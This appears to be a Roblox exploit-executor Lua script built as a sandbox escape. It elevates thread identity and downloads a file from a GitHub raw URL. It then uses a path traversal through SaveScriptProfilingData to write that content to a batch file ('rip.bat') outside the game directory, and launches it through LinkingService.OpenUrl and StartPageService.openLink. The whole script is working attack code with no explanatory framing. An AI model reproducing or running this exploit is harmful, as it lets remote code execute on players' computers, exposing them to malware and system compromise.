if setthreadidentity then
	setthreadidentity(6)
elseif setidentity then
	setidentity(6)
else
	rconsoleprint("noob")
	return
end

local LinkingService = cloneref(Game.service(Game, "LinkingService"))
local StartPageService = cloneref(Game.service(Game, "StartPageService"))
local ScriptContext = cloneref(Game.service(Game, "ScriptContext"))

local scriptContent = Game:HttpGet("https://raw.githubusercontent.com/watameln/VirusTotalBot/refs/heads/master/VirusTotalBot/source/src/main/java/maven/vtmaven/main.java")

local SaveScriptProfilingData = clonefunction(ScriptContext.SaveScriptProfilingData)

local OpenUrl = clonefunction(LinkingService.OpenUrl)
local openUrl = clonefunction(StartPageService.openLink)

local payload = SaveScriptProfilingData(ScriptContext, scriptContent, "../../../../rip.bat")
pcall(OpenUrl, LinkingService, payload)
pcall(openUrl, StartPageService, payload)
